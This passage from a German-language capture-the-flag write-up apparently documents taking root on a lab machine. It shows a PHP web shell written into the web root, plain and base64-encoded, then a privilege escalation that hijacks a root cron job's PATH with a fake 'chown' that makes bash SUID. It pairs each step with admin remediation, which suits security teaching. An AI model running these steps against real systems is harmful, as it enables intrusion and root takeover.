+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass reguläre Benutzer keine Schreibrechte auf das Web-Root-Verzeichnis haben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, Befehle als brad -->  
+                     <pre>  
+echo '<?pHP system($GET["cmd"]); ?>' > /var/www/html/ben.php
+echo 'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg' | base64 -d > /var/www/html/ben.php</pre>   
+                </div>
+            </div>    
+
+            <p class="analysis"><strong>Analyse:</strong> Die User-Flag wird aus `user.txt` im Home-Verzeichnis von `brad` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> User-Flag erfolgreich gelesen: `<span class="password">f70a9801673220fb56f42cf9d5ddc28b</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flag. Fahren Sie mit der PE-Enumeration fort.
+            <br><strong>Empfehlung (Admin):</strong> Standard-CTF-Element.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">brad@crazymed:~$ <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">f70a9801673220fb56f42cf9d5ddc28b</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Suche nach SUID-Dateien als Benutzer `brad`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden nur Standard-SUID-Binaries gefunden. Kein offensichtlicher oder ungewöhnlicher PE-Vektor hier.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Setzen Sie die Enumeration fort (Cron-Jobs, Dienste, Konfigurationsdateien).
+            <br><strong>Empfehlung (Admin):</strong> Regelmäßige Überprüfung der SUID-Binaries.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">brad@crazymed:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                      <pre>
+   138432    472 -rwsr-xr-x   1 root     root       481608 Jul  2 00:37 /usr/lib/openssh/ssh-keysign
+   134292     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5 13:04 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   397340     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+   396973     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
+   397342     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+   393317     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+   393319     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+   396814     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+   393316     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+   393320     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Linux-Distribution und -Version wird mit `lsb_release -a` überprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt Debian GNU/Linux 11 (bullseye). Nützlich für die Suche nach spezifischen Exploits, falls erforderlich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Information zur Kenntnis nehmen.
+            <br><strong>Empfehlung (Admin):</strong> System aktuell halten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">brad@crazymed:/tmp$ <span class="command">lsb_release -a 2>/dev/null</span></div>
+                      <pre>
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 11 (bullseye)
+Release:	11
+Codename:	bullseye</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `pspy64` (muss vorher auf das Ziel hochgeladen worden sein) wird ausgeführt, um laufende Prozesse und insbesondere Cron-Jobs zu überwachen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `pspy` entdeckt einen Cron-Job, der periodisch (`22:53:01`, vermutlich jede Minute) als **root** das Skript `/opt/check_VM` ausführt. Es zeigt auch den `ncat`-Prozess für die eingeschränkte Shell auf Port 4444 und den `memcached`-Prozess. Der Cron-Job ist ein **sehr wichtiger Fund** für Privilege Escalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie sofort den Inhalt und die Berechtigungen des Skripts `/opt/check_VM`. Prüfen Sie, ob Sie das Skript selbst ändern oder die Dateien/Pfade beeinflussen können, mit denen es interagiert.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie alle Cron-Jobs, die als root laufen. Stellen Sie sicher, dass die ausgeführten Skripte sicher sind und nicht von nicht-privilegierten Benutzern manipuliert werden können. Verwenden Sie absolute Pfade in Skripten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">brad@crazymed:/tmp$ <span class="command">./pspy64</span></div>
+                      <pre>
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+[...]
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+[...]
+2022/11/03 22:48:49 CMD: UID=1000 PID=438    | ncat -vlnkp 4444 -c /home/brad/.local/cmd
+2022/11/03 22:48:49 CMD: UID=107  PID=437    | /usr/bin/memcached -m 64 -p 11211 -u memcache -l 0.0.0.0 -P /var/run/memcached/memcached.pid
+2022/11/03 22:48:49 CMD: UID=1000 PID=433    | /bin/sh -c ncat -vlnkp 4444 -c ~/.local/cmd
+[...]
+2022/11/03 22:53:01 CMD: UID=0    PID=2371   | /usr/sbin/CRON -f
+2022/11/03 22:53:01 CMD: UID=0    PID=2372   | /usr/sbin/CRON -f
+2022/11/03 22:53:01 CMD: UID=0    PID=2373   | /bin/sh -c /opt/check_VM
+2022/11/03 22:53:01 CMD: UID=0    PID=2374   | /bin/bash /opt/check_VM
+[...]</pre> <!-- Gekürzt zur Übersichtlichkeit -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Cron-Skripts `/opt/check_VM` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript tut Folgendes als root:
+            1.  Prüft, ob die Flag-Dateien `/root/root.txt` und `/home/brad/user.txt` existieren. Wenn nicht, erstellt es sie mit `mcookie` und setzt die Berechtigungen auf 700.
+            2.  Setzt den Eigentümer von `/var/www/html` rekursiv auf `www-data:www-data`.
+            3.  Löscht die `.bash_history` für alle Benutzer mit Bash-Shell (via Symlink auf `/dev/null`). Enthält einen Tippfehler (`eccho` statt `echo`).
+            4.  Löscht alle Dateien, die auf `.log` enden, im Verzeichnis `/var/log`.
+            Die interessanteste Zeile für PE ist `chown -R www-data:www-data /var/www/html`. Wenn der `chown`-Befehl ohne absoluten Pfad aufgerufen wird und wir den `PATH` beeinflussen können oder `/usr/local/bin` (wo Benutzer oft Schreibrechte haben) früh im PATH von root liegt, könnten wir eine eigene `chown`-Datei in einem solchen Verzeichnis erstellen, die dann anstelle des echten `chown` ausgeführt wird.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie den `PATH` von root (schwierig ohne root-Rechte, aber `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` ist Standard). Erstellen Sie ein bösartiges Skript namens `chown` in einem Verzeichnis, das im `PATH` von root vor `/bin` liegt und auf das `brad` Schreibrechte hat (z.B. `/usr/local/bin`, falls schreibbar, oder `/tmp`, falls es im PATH ist). Dieses Skript sollte z.B. `/bin/bash` SUID root machen. Warten Sie, bis der Cron-Job läuft und Ihr Skript ausführt.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie immer absolute Pfade für Befehle in Skripten, die als root laufen (z.B. `/bin/chown` statt `chown`). Stellen Sie sicher, dass Verzeichnisse im `PATH` von root nicht für normale Benutzer schreibbar sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">brad@crazymed:/tmp$ <span class="command">cat /opt/check_VM</span></div>
+                      <pre>
+#! /bin/bash
+
+#users flags
+flags=(/root/root.txt /home/brad/user.txt)
+for x in "${flags[@]}"
+do
+if [[ ! -f $x ]] ; then
+echo "$x doesn't exist"
+mcookie > $x
+chmod 700 $x
+fi
+done
+
+chown -R www-data:www-data /var/www/html
+
+#bash_history => /dev/null
+home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')
+
+for x in $home
+do
+ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
+done
+
+
+find /var/log -name ".log" -exec rm -f {} +</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Diese Befehle scheinen Versuche zu sein, die Auswirkungen des Cron-Jobs zu beobachten oder andere Prozesse zu finden, sind aber für die eigentliche Privilege Escalation weniger relevant als die Analyse des Cron-Skripts selbst.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Beobachtung der `user.txt` zeigt keine Änderung durch den Cron-Job. Die Prozessdifferenzierung mit `ps` und `diff` ist eine Methode zur Prozessüberwachung, liefert hier aber keine neuen Erkenntnisse bezüglich des Cron-Jobs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Ausnutzung des `chown`-Befehls im Cron-Skript mittels PATH Hijacking.
+            <br><strong>Empfehlung (Admin):</strong> Administrative Aktionen des Pentesters.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">brad@crazymed:/tmp$ <span class="command">for i in {1..100};do cat /home/brad/user.txt;sleep 1; done</span></div>
+                    <pre>
+f70a9801673220fb56f42cf9d5ddc28b
+f70a9801673220fb56f42cf9d5ddc28b
+[...]</pre>
+                     <div class="prompt">brad@crazymed:/tmp$ <span class="command">IFS=$'\n'</span></div>
+                     <div class="prompt">brad@crazymed:/tmp$ <span class="command">old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)</span></div>
+                     <div class="prompt">brad@crazymed:/tmp$ <span class="command">while true; do new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0); diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]; sleep 1; old_process=$new_process; done</span></div>
+                     <pre>
+[...]
+< root        3761  0.0  0.0      0     0 ?        I    23:03   0:00  \_ [kworker/u2:3-events_unbound]
+> root        3761  0.0  0.0      0     0 ?        I    23:03   0:00  \_ [kworker/u2:3-flush-8:0]
+[...]</pre> <!-- Prozess-Differenzen -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Weitere Enumerationsversuche: `ss -lnpt` zeigt lauschende Ports, `find` sucht erneut nach SUID-Dateien, und ein weiterer `find`-Befehl sucht nach kürzlich geänderten Dateien, die "pass" im Namen enthalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `ss` bestätigt den `ncat`-Listener auf 4444 und die anderen bekannten Ports. Die SUID-Suche liefert wieder nur Standard-Binaries. Die `find`-Suche nach "pass" listet viele Dateien auf, die meisten sind Standard-Systemdateien oder Dokumentation. `/etc/pam.d/common-password` und `/etc/passwd` sind relevant, aber ohne Schreibrechte nicht direkt nützlich. Die Zertifikate sind ebenfalls nicht direkt hilfreich. Es gibt keine offensichtlichen Funde, die auf einen einfachen PE-Vektor hindeuten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der vielversprechendste Weg bleibt die Ausnutzung des Cron-Jobs `/opt/check_VM` über PATH Hijacking des `chown`-Befehls.
+             <br><strong>Empfehlung (Admin):</strong> Administrative Aktionen des Pentesters.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">brad@crazymed:/tmp$ <span class="command">ss -lnpt</span></div>
+                       <pre>
+State     Recv-Q    Send-Q         Local Address:Port          Peer Address:Port    Process
+LISTEN    0         10                   0.0.0.0:4444               0.0.0.0:        users:(("ncat",pid=438,fd=4))
+LISTEN    0         1024                 0.0.0.0:11211              0.0.0.0:
+LISTEN    0         128                  0.0.0.0:22                 0.0.0.0:
+LISTEN    0         10                      []:4444                  []:        users:(("ncat",pid=438,fd=3))
+LISTEN    0         511                        :80                       :
+LISTEN    0         128                     []:22                    []:</pre>
+                       <div class="prompt">brad@crazymed:/tmp$ <span class="command">find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</span></div>
+                       <pre>
+-rwsr-xr-x 1 root root 481608 Jul  2 00:37 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51336 Oct  5 13:04 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
+-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
+-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
+-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd</pre>
+                        <div class="prompt">brad@crazymed:/dev/shm$ <span class="command">find / -newermt "21-10-01" ! -newermt "22-11-06" -ls 2>/dev/null | grep pass</span></div>
+                        <pre>[... lange Liste von Dateien ...]</pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Versuch, `/dev/fb0` (Framebuffer-Gerät) zu überwachen, wird gezeigt. Es ist unklar, was damit erreicht werden soll.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt scheint irrelevant für die Privilege Escalation zu sein.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">brad@crazymed:/tmp$ <span class="command">for i in {1..200};do ls -la /dev/fb0;sleep 1;clear;done</span></div>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird ein Zertifikat (`Buypass_Class_2_Root_CA.crt`) angezeigt. Der Kontext ist unklar, möglicherweise wurde es bei der `find`-Suche nach "pass" gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Standard-Root-Zertifikate sind normalerweise nicht für PE nützlich.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">brad@crazymed:/dev/shm$ <span class="command">cat /usr/share/ca-certificates/mozilla/Buypass_Class_2_Root_CA.crt</span></div>
+                       <pre>-----BEGIN CERTIFICATE-----
+[...]
+-----END CERTIFICATE-----</pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">brad@crazymed:/usr/lib/modules/5.10.0-18-amd64/kernel/drivers/media/cec/usb/rainshadow$ <span class="command">cat /usr/share/ca-certificates/mozilla/Buypass_Class_3_Root_CA.crt</span></div>
+                       <pre>-----BEGIN CERTIFICATE-----
+[...]
+-----END CERTIFICATE-----</pre>
+                  </div>
+              </div>
+
+             <!-- POC Abschnitt beginnt hier -->
+            <section id="poc">
+                <h2>Proof of Concept (Privilege Escalation via PATH Hijacking & SUID Bash)</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Ein Cron-Job (`/opt/check_VM`) läuft periodisch als root und führt unter anderem den Befehl `chown` ohne absoluten Pfad aus. Der Benutzer `brad` kann ein eigenes Skript namens `chown` in einem Verzeichnis erstellen, das im `PATH` von root vor `/bin` liegt (hier wird `/usr/local/bin` angenommen oder ein anderes schreibbares Verzeichnis im PATH). Dieses bösartige Skript setzt das SUID-Bit auf `/bin/bash`. Wenn der Cron-Job das nächste Mal läuft, führt er das bösartige Skript aus. Anschließend kann `bash -p` verwendet werden, um eine Root-Shell zu erhalten.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                    <ul>
+                        <li>Shell-Zugriff als Benutzer `brad`.</li>
+                        <li>Ein als root laufender Cron-Job, der einen Befehl (hier `chown`) ohne absoluten Pfad aufruft.</li>
+                        <li>Schreibrechte für `brad` auf ein Verzeichnis, das im `PATH` von root vor dem Verzeichnis des Originalbefehls liegt (z.B. `/usr/local/bin`, `/tmp` falls im PATH).</li>
+                    </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                 <p class="analysis"><strong>1. Erstellen des bösartigen Skripts:</strong> Der Benutzer `brad` wechselt nach `/usr/local/bin` (oder ein anderes geeignetes Verzeichnis) und erstellt dort ein Skript namens `chown`.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Das Skript wird erstellt. Es enthält den Befehl, das SUID-Bit auf `/bin/bash` zu setzen.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Machen Sie das Skript ausführbar und warten Sie, bis der Cron-Job (`/opt/check_VM`) läuft.
+                 <br><strong>Empfehlung (Admin):</strong> Verwenden Sie absolute Pfade in Cron-Jobs. Stellen Sie sicher, dass Verzeichnisse im `PATH` von root nicht für normale Benutzer schreibbar sind.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">brad@crazymed:~$ <span class="command">cd /usr/local/bin</span></div>
+                           <div class="prompt">brad@crazymed:/usr/local/bin$ <span class="command">vi chown</span></div> <!-- Oder nano -->
+                           <div class="prompt">brad@crazymed:/usr/local/bin$ <span class="command">cat chown</span></div>
+                           <pre>
+#!/bin/bash
+
+chmod u+s /bin/bash</pre>
+                      </div>
+                  </div>
+
+                 <p class="analysis"><strong>2. Ausführbar machen und Warten:</strong> Das Skript `/usr/local/bin/chown` wird ausführbar gemacht (`chmod +x chown`). Anschließend wird gewartet, bis der Cron-Job `/opt/check_VM` das nächste Mal ausgeführt wird (typischerweise innerhalb einer Minute).</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Wenn der Cron-Job läuft, führt er `chown -R www-data:www-data /var/www/html` aus. Da `/usr/local/bin` (vermutlich) im `PATH` vor `/bin` steht, wird das bösartige Skript ausgeführt. Dieses setzt das SUID-Bit auf `/bin/bash`.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie nach kurzer Wartezeit die Berechtigungen von `/bin/bash`.
+                 <br><strong>Empfehlung (Admin):</strong> Beheben Sie die PATH-Problematik und verwenden Sie absolute Pfade.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">brad@crazymed:/usr/local/bin$ <span class="command">chmod 777 chown</span></div> <!-- 777 ist übertrieben, +x reicht -->
+                           <div class="prompt">brad@crazymed:/usr/local/bin$ <span class="command">chmod +x chown</span></div>
+                      </div>
+                  </div>
+
+                 <p class="analysis"><strong>3. Überprüfung und Ausführung von SUID Bash:</strong> Die Berechtigungen von `/bin/bash` werden überprüft. Sie zeigen nun das SUID-Bit (`-rwsr-xr-x`). Anschließend wird `/bin/bash -p` ausgeführt.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Das PATH-Hijacking war erfolgreich, das SUID-Bit wurde gesetzt. Das Ausführen von `bash -p` liefert eine Shell mit `euid=0(root)`.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt. Suchen Sie die Root-Flag.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie das bösartige Skript, korrigieren Sie die `sudo`-Regel und entfernen Sie das SUID-Bit von `/bin/bash` (`chmod u-s /bin/bash`).</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">brad@crazymed:/dev/shm$ <span class="command">ls -la /bin/bash</span></div>
+                           <pre>-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash</pre>
+                           <div class="prompt">brad@crazymed:/dev/shm$ <span class="command">/bin/bash -p</span></div>
+                           <div class="prompt">bash-5.1# </div>
+                      </div>
+                  </div>
+
+                  <p class="analysis"><strong>4. Auslesen der Root-Flag:</strong> Als Root wird in `/root` gewechselt und `root.txt` ausgelesen.</p>
+                  <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">b9b38d9533ca00072eff46338bf21b43</span>` wird erfolgreich gelesen.</p>
+                  <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht.
+                  <br><strong>Empfehlung (Admin):</strong> Beheben Sie die zugrundeliegenden Schwachstellen.</p>
+                  <div class="code-block">
+                       <div class="terminal">
+                           <div class="prompt">bash-5.1# <span class="command">cd /root/</span></div>
+                           <div class="prompt">bash-5.1# <span class="command">ls</span></div>
+                           <pre>root.txt</pre>
+                           <div class="prompt">bash-5.1# <span class="command">cat root.txt</span></div>
+                           <pre><span class="password">b9b38d9533ca00072eff46338bf21b43</span></pre>
+                       </div>
+                   </div>
+                   <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Die Kombination aus einem Cron-Job, der Befehle ohne absoluten Pfad ausführt, und einem für den Benutzer schreibbaren Verzeichnis im `PATH` von root ermöglicht eine zuverlässige Privilege Escalation.</p>
+                   <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                     <ol>
+                         <li>Verwenden Sie immer absolute Pfade für Befehle in Skripten, die mit erhöhten Rechten (insbesondere als root via Cron) ausgeführt werden (z.B. `/bin/chown` statt `chown`).</li>
+                         <li>Stellen Sie sicher, dass Verzeichnisse, die im `PATH`-Environment von privilegierten Benutzern (wie root) enthalten sind, nicht für nicht-privilegierte Benutzer schreibbar sind. Insbesondere `/usr/local/bin`, `/usr/local/sbin` sollten nur für root schreibbar sein.</li>
+                         <li>Entfernen Sie das SUID-Bit von `/bin/bash`, falls es durch den Angriff gesetzt wurde (`chmod u-s /bin/bash`).</li>
+                         <li>Überprüfen Sie alle Cron-Jobs auf ähnliche Schwachstellen.</li>
+                     </ol>
+                  </p>
+            </section> <!-- POC Abschnitt endet hier -->
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/brad/user.txt</div>
+                     <div class="flag-value"><span class="password">f70a9801673220fb56f42cf9d5ddc28b</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">b9b38d9533ca00072eff46338bf21b43</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-11-02</p>
+    </footer>
+</body>
+</html>
